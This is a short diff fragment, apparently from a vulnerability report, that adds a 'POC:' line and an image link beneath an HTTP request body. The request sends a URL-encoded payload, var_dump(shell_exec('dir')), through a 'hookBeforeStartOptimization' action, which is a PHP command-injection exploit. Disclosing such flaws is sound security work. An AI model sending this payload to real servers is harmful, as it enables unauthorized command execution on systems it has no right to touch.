@@ -22,3 +22,6 @@ Priority: u=0
 
 action=hookBeforeStartOptimization&script=%7b%0a%20%20%22test%22%3a%20%7b%0a%20%20%20%20%22value%22%3a%20%22var_dump(shell_exec('dir'))%3b%22%0a%20%20%7d%0a%7d
 ```
+POC:
+
+<img src="https://imgur.com/DyzyW6e.png">
